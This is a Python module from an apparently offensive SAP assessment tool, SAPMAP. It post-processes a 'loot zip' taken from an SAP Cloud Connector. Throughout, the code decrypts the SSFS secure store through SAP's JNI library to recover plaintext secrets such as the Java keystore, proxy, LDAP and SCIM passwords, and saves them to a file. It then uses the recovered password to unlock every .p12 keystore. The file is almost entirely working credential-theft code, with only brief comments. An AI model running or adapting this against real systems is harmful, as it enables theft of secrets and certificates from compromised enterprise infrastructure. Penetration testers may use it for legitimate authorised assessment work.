#!/usr/bin/env python3
"""SAPMAP — decrypt the SAP Cloud Connector SSFS and unlock its keystores.

Two-stage post-processing of the loot zip produced by sapmap_scc_keystore:

    1. SSFS decryption.  Run the JNI helper at tools/ssfs_decrypt/
       decrypt-ssfs.jar (built by the operator from the bundled .java
       sources) which calls libsapscc20jni's getRecord() to recover the
       plaintext for each SSFS entry.  The juicy one is
       CLOUD_CONN/JAVA_KEYSTORE_PASSWORD — that password unlocks every
       .p12 in the SCC backup.

    2. Keystore unlock.  With JAVA_KEYSTORE_PASSWORD in hand, every .p12
       inside the loot zip is loaded with `cryptography`'s pkcs12
       parser.  We read out the alias, certificate (subject, issuer,
       SHA-256 of DER), and the private-key SHA-256 (DER form, no key
       material exfiltrated to logs).

Cross-platform: the Java helper supports Linux (libsapscc20jni.so) and
Windows (sapscc20jni.dll) via the JVM property -Dscc.jni.lib=<abspath>,
or by relying on java.library.path / LD_LIBRARY_PATH / PATH.

The plaintext SSFS dump is written to a side file under the same loot
directory at mode 0600 so the operator can review the values without
SAPMAP itself logging them.  Findings/drawer only show the *names* of
recovered keys, not their values.
"""
from __future__ import annotations

import hashlib
import io
import json
import os
import platform
import shutil
import subprocess
import tempfile
import zipfile
from datetime import datetime
from typing import Optional


SSFS_KEYS = (
    "CLOUD_CONN/JAVA_KEYSTORE_PASSWORD",
    "CLOUD_CONN/SYSTEM_CERTIFICATE",
    "CLOUD_CONN/PROXY_PASSWORD",
    "CLOUD_CONN/KERBEROS_KTAB",
    "CLOUD_CONN/LDAP_SERVICE_USER_PASSWORD",
    "CLOUD_CONN/SCIM_SERVICE_USER_PASSWD",
    "CLOUD_CONN/ALERT_EMAIL_SERVER_SECRET",
)

# Installer-default locations of libsapscc20jni — operators can override.
DEFAULT_NATIVE_HINTS_LINUX = (
    "/opt/sap/scc/lib/libsapscc20jni.so",
    "/opt/sap/scc/libsapscc20jni.so",
    "/usr/lib/libsapscc20jni.so",
    "/opt/sap/scc20/lib/native/libsapscc20jni.so",
)
DEFAULT_NATIVE_HINTS_WIN = (
    r"C:\Program Files\sapcc\lib\sapscc20jni.dll",
    r"C:\sap\scc\lib\sapscc20jni.dll",
    r"C:\sapcc\sapscc20jni.dll",
    r"C:\SAP\scc20\lib\native\sapscc20jni.dll",
    r"C:\SAP\scc20\util\sapscc20jni.dll",
)
# macOS hints — SAP ships ``libsapscc20jni.dylib`` inside the portable
# archive (Intel and Apple-silicon flavours).  We honour both arch dirs
# so an operator who copied the dylib to a custom path still hits one of
# these.  The architecture must match the JVM you're running (an arm64
# JVM cannot load an x86_64 dylib and vice-versa).
DEFAULT_NATIVE_HINTS_MAC_ARM64 = (
    "/Applications/sapcc/lib/native/libsapscc20jni.dylib",
    os.path.expanduser("~/sapcc-osx-arm64/lib/native/libsapscc20jni.dylib"),
    os.path.expanduser("~/sapcc/lib/native/libsapscc20jni.dylib"),
    "/usr/local/sapcc/lib/native/libsapscc20jni.dylib",
)
DEFAULT_NATIVE_HINTS_MAC_X86_64 = (
    "/Applications/sapcc/lib/native/libsapscc20jni.dylib",
    os.path.expanduser("~/sapcc-osx-x86_64/lib/native/libsapscc20jni.dylib"),
    os.path.expanduser("~/sapcc/lib/native/libsapscc20jni.dylib"),
    "/usr/local/sapcc/lib/native/libsapscc20jni.dylib",
)


def _slug(s: str) -> str:
    import re
    return re.sub(r"[^A-Za-z0-9._-]+", "_", s or "?")


def _sha256(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def find_helper_jar(start_dir: Optional[str] = None) -> Optional[str]:
    """Locate the operator-built decrypt-ssfs.jar.

    Search order: explicit env var SAPMAP_SSFS_JAR -> tools/ssfs_decrypt/
    relative to the SAPMAP project -> CWD.
    """
    env = os.environ.get("SAPMAP_SSFS_JAR")
    if env and os.path.isfile(env):
        return env
    here = os.path.dirname(os.path.abspath(__file__))
    candidates = [
        os.path.join(here, "tools", "ssfs_decrypt", "decrypt-ssfs.jar"),
        os.path.join(start_dir or os.getcwd(), "decrypt-ssfs.jar"),
    ]
    for c in candidates:
        if os.path.isfile(c):
            return c
    return None


def find_native_lib(scc_native_dir: Optional[str] = None) -> Optional[str]:
    """Locate libsapscc20jni.so / sapscc20jni.dll.

    If ``scc_native_dir`` is a directory we look for both names inside
    it; if it's a file we return it as-is.  Otherwise we try the
    installer-default hints for the running OS.
    """
    if scc_native_dir:
        if os.path.isfile(scc_native_dir):
            return scc_native_dir
        if os.path.isdir(scc_native_dir):
            for name in ("libsapscc20jni.so",
                         "sapscc20jni.dll",
                         "libsapscc20jni.dylib"):
                p = os.path.join(scc_native_dir, name)
                if os.path.isfile(p):
                    return p
    sysname = platform.system().lower()
    if sysname.startswith("win"):
        hints = DEFAULT_NATIVE_HINTS_WIN
    elif sysname == "darwin":
        # On macOS pick the hint set matching the JVM/CPU arch — an
        # arm64 dylib can't be loaded by an x86_64 JVM and vice-versa.
        machine = (platform.machine() or "").lower()
        if machine in ("arm64", "aarch64"):
            hints = DEFAULT_NATIVE_HINTS_MAC_ARM64
        else:
            hints = DEFAULT_NATIVE_HINTS_MAC_X86_64
    else:
        hints = DEFAULT_NATIVE_HINTS_LINUX
    for h in hints:
        if os.path.isfile(h):
            return h
    return None


def _detect_ssfs_sid(blob: bytes) -> Optional[str]:
    """SSFS files store the SAP system identifier (SID) inline so the JNI
    can validate it.  The byte layout is:
        magic 'RSecSSFs' + record-type + zero-padding + 'SYSTEM<spaces>SID<spaces>'
    where SID is padded to 8 bytes with ASCII spaces.

    The JNI's getRecord() builds its data-file path as
    ``RSEC_SSFS_DATAPATH/SSFS_<SAPSYSTEMNAME>.DAT`` — when the embedded SID
    differs from what we set in SAPSYSTEMNAME the lookup silently returns
    null.  Detect the embedded SID so we can stage the files under the
    correct filename.
    """
    import re
    # Look for ASCII "SYSTEM" followed by whitespace and 1-8 chars of SID.
    m = re.search(rb"SYSTEM[\x20]+([A-Z0-9_]{1,8})", blob)
    if m:
        return m.group(1).decode("ascii", errors="replace")
    return None


def _extract_ssfs_to_tmp(loot_zip_path: str) -> Optional[tuple]:
    """Extract scc_config/SSFS_SCC.{KEY,DAT} from the loot zip into a
    fresh temp dir at mode 0700.  Returns ``(tmpdir, sid)`` so the caller
    knows which SAPSYSTEMNAME the JNI helper needs.  ``sid`` is detected
    from the file contents — the on-disk filename is meaningless to the
    JNI, which only honours ``SSFS_<SAPSYSTEMNAME>.{KEY,DAT}``.
    """
    try:
        zf = zipfile.ZipFile(loot_zip_path)
    except Exception:
        return None
    members = {i.filename: i for i in zf.infolist()}
    key = members.get("scc_config/SSFS_SCC.KEY")
    dat = members.get("scc_config/SSFS_SCC.DAT")
    if not (key and dat):
        return None
    key_blob = zf.read(key)
    dat_blob = zf.read(dat)
    sid = _detect_ssfs_sid(dat_blob) or _detect_ssfs_sid(key_blob) or "SCC"
    tmp = tempfile.mkdtemp(prefix="sapmap_ssfs_")
    try:
        os.chmod(tmp, 0o700)
    except Exception:
        pass
    with open(os.path.join(tmp, f"SSFS_{sid}.KEY"), "wb") as f:
        f.write(key_blob)
    with open(os.path.join(tmp, f"SSFS_{sid}.DAT"), "wb") as f:
        f.write(dat_blob)
    return tmp, sid


def decrypt_ssfs(loot_zip_path: str, *,
                 scc_native_lib: Optional[str] = None,
                 helper_jar: Optional[str] = None,
                 java_bin: str = "java",
                 sid: str = "SCC",
                 timeout: float = 30.0,
                 keys: Optional[tuple] = None
                 ) -> dict:
    """Run the JNI helper against the SSFS pulled from the loot zip.

    Returns ``{ok, secrets: {key: plaintext|None}, error}``.  ``secrets``
    is the parsed JSON dict from the helper.  Caller is responsible for
    persisting the values securely.
    """
    if not os.path.isfile(loot_zip_path):
        return {"ok": False, "error": f"loot zip not found: {loot_zip_path}"}
    jar = helper_jar or find_helper_jar()
    if not jar:
        return {"ok": False,
                "error": "decrypt-ssfs.jar not built — run "
                         "`make` in tools/ssfs_decrypt/ on a host with "
                         "JDK + libsapscc20jni installed"}
    native = scc_native_lib or find_native_lib()
    if not native:
        return {"ok": False,
                "error": "libsapscc20jni.so / sapscc20jni.dll not found — "
                         "pass scc_native_lib or set its directory"}
    if not shutil.which(java_bin):
        return {"ok": False,
                "error": f"`{java_bin}` not on PATH — install a JDK or pass java_bin"}

    extracted = _extract_ssfs_to_tmp(loot_zip_path)
    if not extracted:
        return {"ok": False, "error": "loot zip lacks SSFS_SCC.KEY/.DAT"}
    tmp, embedded_sid = extracted
    # The JNI silently returns null when SAPSYSTEMNAME doesn't match the
    # SID embedded in the SSFS — prefer the embedded value over the
    # caller's hint.
    effective_sid = embedded_sid or sid
    try:
        cmd = [java_bin, f"-Dscc.jni.lib={native}",
               "-jar", jar]
        if keys:
            cmd.extend(keys)
        env = os.environ.copy()
        env["SAPSYSTEMNAME"] = effective_sid
        env["RSEC_SSFS_DATAPATH"] = tmp
        # Make sure JNI can also locate the lib via OS search path.
        sysname = platform.system().lower()
        native_dir = os.path.dirname(native)
        if sysname.startswith("win"):
            env["PATH"] = native_dir + os.pathsep + env.get("PATH", "")
        elif sysname == "darwin":
            env["DYLD_LIBRARY_PATH"] = (
                native_dir + os.pathsep
                + env.get("DYLD_LIBRARY_PATH", ""))
            # Newer macOS JVMs honour DYLD_FALLBACK_LIBRARY_PATH when
            # SIP strips DYLD_LIBRARY_PATH on /usr/bin/java; set both.
            env["DYLD_FALLBACK_LIBRARY_PATH"] = (
                native_dir + os.pathsep
                + env.get("DYLD_FALLBACK_LIBRARY_PATH", ""))
        else:
            env["LD_LIBRARY_PATH"] = (
                native_dir + os.pathsep
                + env.get("LD_LIBRARY_PATH", ""))
        try:
            proc = subprocess.run(cmd, env=env, capture_output=True,
                                  timeout=timeout, text=True)
        except subprocess.TimeoutExpired:
            return {"ok": False, "error": f"java helper timed out after {timeout}s"}
        if proc.returncode != 0:
            return {"ok": False,
                    "error": f"java helper exit {proc.returncode}: "
                             f"{(proc.stderr or '').strip()[:300]}"}
        out = (proc.stdout or "").strip()
        if not out:
            return {"ok": False, "error": "java helper produced empty output"}
        try:
            secrets = json.loads(out.splitlines()[-1])
        except Exception as e:
            return {"ok": False,
                    "error": f"could not parse helper output as JSON: {e}; "
                             f"stdout={out[:200]!r}"}
        return {"ok": True, "secrets": secrets, "native_lib": native,
                "helper_jar": jar, "sid": effective_sid}
    finally:
        try:
            shutil.rmtree(tmp, ignore_errors=True)
        except Exception:
            pass


def unlock_keystores(loot_zip_path: str, password: str) -> dict:
    """Open every .p12 in the loot zip with ``password`` and pull metadata.

    Returns ``{ok, keystores: [...], error}``.  Each keystore entry:
        path, alias, friendly_name, cert_subject, cert_issuer,
        cert_sha256, cert_not_before, cert_not_after, key_type,
        key_size, key_sha256, extra_certs (list of subjects)

    NOTE: SCC's REST `/api/v1/configuration/backup` endpoint applies a
    second layer of SAP-proprietary wrapping over each .p12 inside the
    zip (sealed with the *backup* password sent in the POST body, NOT
    with JAVA_KEYSTORE_PASSWORD).  Those wrapped blobs cannot be opened
    by any standard PKCS12 parser — every entry will surface
    ``error: 'wrapped: <reason>'`` here.  To recover real keystores you
    need filesystem access to the SCC install dir (``scc_config\\scc.p12``,
    ``config\\ks.p12``, and the per-subaccount ``scc.p12`` files), which
    are stored as standard PKCS12 sealed with JAVA_KEYSTORE_PASSWORD.
    """
    try:
        from cryptography.hazmat.primitives.serialization import (
            pkcs12, Encoding, PrivateFormat, NoEncryption,
            PublicFormat,
        )
        from cryptography.hazmat.primitives.asymmetric import rsa, ec
    except Exception as e:
        return {"ok": False,
                "error": f"`cryptography` not installed: {e}; "
                         f"pip install cryptography"}
    try:
        zf = zipfile.ZipFile(loot_zip_path)
    except Exception as e:
        return {"ok": False, "error": f"cannot open loot zip: {e}"}
    pwd = password.encode() if password else None
    out = []
    for info in zf.infolist():
        if not info.filename.endswith(".p12"):
            continue
        blob = zf.read(info)
        try:
            key, cert, extras = pkcs12.load_key_and_certificates(blob, pwd)
        except Exception as e:
            head = blob[:2]
            wrapped = head[:1] != b"\x30"
            out.append({
                "path": info.filename,
                "error": ("wrapped: SAP backup adds a second encryption "
                          "layer over the .p12; can't be parsed as PKCS12. "
                          "Use filesystem access to the SCC install dir "
                          "for unwrapped keystores.") if wrapped
                         else f"unlock failed: {e}",
                "is_sap_wrapped": wrapped,
            })
            continue
        entry = {"path": info.filename}
        if cert is not None:
            der = cert.public_bytes(Encoding.DER)
            entry.update({
                "cert_subject": cert.subject.rfc4514_string(),
                "cert_issuer": cert.issuer.rfc4514_string(),
                "cert_sha256": _sha256(der),
                "cert_not_before": cert.not_valid_before_utc.isoformat()
                                    if hasattr(cert, "not_valid_before_utc")
                                    else cert.not_valid_before.isoformat(),
                "cert_not_after":  cert.not_valid_after_utc.isoformat()
                                    if hasattr(cert, "not_valid_after_utc")
                                    else cert.not_valid_after.isoformat(),
                "cert_serial": format(cert.serial_number, "x"),
            })
        if key is not None:
            try:
                pk_der = key.public_key().public_bytes(
                    Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
                entry["key_pubkey_sha256"] = _sha256(pk_der)
            except Exception:
                entry["key_pubkey_sha256"] = ""
            entry["key_type"] = type(key).__name__
            try:
                entry["key_size"] = key.key_size
            except Exception:
                entry["key_size"] = 0
        if extras:
            entry["extra_subjects"] = [c.subject.rfc4514_string() for c in extras]
            entry["extra_count"] = len(extras)
        out.append(entry)
    return {"ok": True, "keystores": out}


def decrypt_and_unlock(loot_zip_path: str, *,
                       scc_native_lib: Optional[str] = None,
                       helper_jar: Optional[str] = None,
                       java_bin: str = "java",
                       sid: str = "SCC",
                       loot_dir: Optional[str] = None,
                       timeout: float = 30.0
                       ) -> dict:
    """High-level: decrypt SSFS, unlock all .p12s, persist plaintext to
    a separate ``ssfs_secrets_<ts>.json`` next to the loot zip at mode 0600.

    Returns the merged result; caller (GUI route) decides which fields
    to surface in findings vs the drawer.
    """
    res = decrypt_ssfs(loot_zip_path,
                       scc_native_lib=scc_native_lib,
                       helper_jar=helper_jar, java_bin=java_bin,
                       sid=sid, timeout=timeout)
    if not res.get("ok"):
        return res
    secrets = res.get("secrets") or {}
    pwd = secrets.get("CLOUD_CONN/JAVA_KEYSTORE_PASSWORD") or ""
    # Persist plaintext side-channel.  Drawer / findings will only
    # reference this path; the values themselves never enter findings.
    out_dir = loot_dir or os.path.dirname(os.path.abspath(loot_zip_path))
    ts = datetime.now().strftime("%Y%m%dT%H%M%S")
    secrets_path = os.path.join(out_dir, f"ssfs_secrets_{ts}.json")
    body = {
        "fetched_at": datetime.now().isoformat(timespec="seconds"),
        "loot_zip": os.path.abspath(loot_zip_path),
        "native_lib": res.get("native_lib", ""),
        "sid": res.get("sid", sid),
        "secrets": secrets,
    }
    try:
        with open(secrets_path, "w", encoding="utf-8") as f:
            json.dump(body, f, indent=2)
        try:
            os.chmod(secrets_path, 0o600)
        except Exception:
            pass
    except Exception as e:
        return {"ok": False,
                "error": f"could not persist plaintext secrets: {e}"}
    out = {
        "ok": True,
        "secrets_path": secrets_path,
        "secrets_keys": [k for k, v in secrets.items() if v],
        "secrets_missing": [k for k, v in secrets.items() if not v],
        "native_lib": res.get("native_lib", ""),
        "helper_jar": res.get("helper_jar", ""),
        "sid": res.get("sid", sid),
        "keystore_password_recovered": bool(pwd),
        "keystore_password_length": len(pwd),
    }
    if pwd:
        un = unlock_keystores(loot_zip_path, pwd)
        out["unlock_ok"] = un.get("ok", False)
        out["unlock_error"] = un.get("error", "")
        out["keystores"] = un.get("keystores", [])
    else:
        out["unlock_ok"] = False
        out["unlock_error"] = "JAVA_KEYSTORE_PASSWORD not in SSFS"
        out["keystores"] = []
    return out
